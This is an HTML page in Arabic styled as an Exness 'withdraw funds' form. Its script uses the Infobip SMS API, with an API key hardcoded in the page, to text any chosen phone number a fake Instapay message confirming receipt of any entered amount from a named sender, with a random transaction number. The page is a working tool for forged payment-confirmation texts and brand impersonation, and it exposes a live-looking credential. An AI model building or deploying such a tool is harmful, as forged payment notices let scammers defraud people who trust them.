<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exness - سحب الأموال</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); width: 100%; max-width: 380px; }
        .logo { font-weight: bold; font-size: 26px; color: #000; margin-bottom: 20px; text-align: left; letter-spacing: -1px; }
        h3 { margin-bottom: 20px; font-size: 18px; color: #333; }
        label { display: block; margin-bottom: 8px; font-size: 13px; color: #777; }
        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #e0e0e0; border-radius: 6px; box-sizing: border-box; font-size: 16px; transition: border 0.3s; }
        input:focus { border-color: #ffce00; outline: none; }
        button { width: 100%; padding: 14px; background-color: #ffce00; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; color: #000; }
        button:hover { background-color: #e6ba00; }
        .status { margin-top: 15px; font-size: 13px; text-align: center; min-height: 20px; }
    </style>
</head>
<body>

<div class="card">
    <div class="logo">exness</div>
    <h3>سحب الأموال</h3>
    
    <label>رقم الهاتف المستلم (بصيغة 01xxxxxxxxx)</label>
    <input type="text" id="userPhone" placeholder="أدخل رقمك للتجربة">

    <label>المبلغ المراد سحبه (ج.م)</label>
    <input type="number" id="inputAmount" placeholder="مثلاً: 448650">

    <button id="sendBtn" onclick="processWithdrawal()">تأكيد عملية السحب</button>
    
    <div id="statusMsg" class="status"></div>
</div>

<script>
async function processWithdrawal() {
    const amount = document.getElementById('inputAmount').value;
    const phone = document.getElementById('userPhone').value;
    const btn = document.getElementById('sendBtn');
    const status = document.getElementById('statusMsg');

    if(!amount || !phone) {
        alert("يرجى ملء كافة الخانات");
        return;
    }

    // تعطيل الزر أثناء الإرسال
    btn.disabled = true;
    btn.innerText = "جاري المعالجة...";
    status.innerText = "جاري إرسال طلب السحب للبنك...";

    // مفاتيح Infobip الخاصة بك
    const apiKey = "2b6362b169aa1a07ac10a516ab426021-b0ddf181-c4fd-4adf-97ab-6f2b51d2ba11";
    const baseUrl = "4kejl6.api.infobip.com";

    // تنسيق الرقم (إضافة كود مصر)
    let formattedPhone = phone.startsWith('0') ? '2' + phone : phone;

    // نص الرسالة
    const messageText = `Instapay: تم استقبال مبلغ ${amount} ج.م من أحمد حجاج. رقم العملية: ${Math.floor(Math.random()*1000000)}`;

    try {
        const response = await fetch(`https://${baseUrl}/sms/2/text/advanced`, {
            method: 'POST',
            headers: {
                "Authorization": `App ${apiKey}`,
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            body: JSON.stringify({
                "messages": [{
                    "destinations": [{"to": formattedPhone}],
                    "from": "ServiceSMS",
                    "text": messageText
                }]
            })
        });

        const result = await response.json();
        
        if (response.ok) {
            status.style.color = "green";
            status.innerText = "✅ تم الإرسال! ستصلك رسالة SMS الآن.";
            alert("نجحت التجربة! تفقد هاتفك الآن.");
        } else {
            status.style.color = "red";
            status.innerText = "❌ خطأ: " + (result.description || "تأكد من الرصيد");
        }
    } catch (error) {
        status.style.color = "red";
        status.innerText = "❌ حدث خطأ في الاتصال بالسيرفر";
    } finally {
        btn.disabled = false;
        btn.innerText = "تأكيد عملية السحب";
    }
}
</script>

</body>
</html>
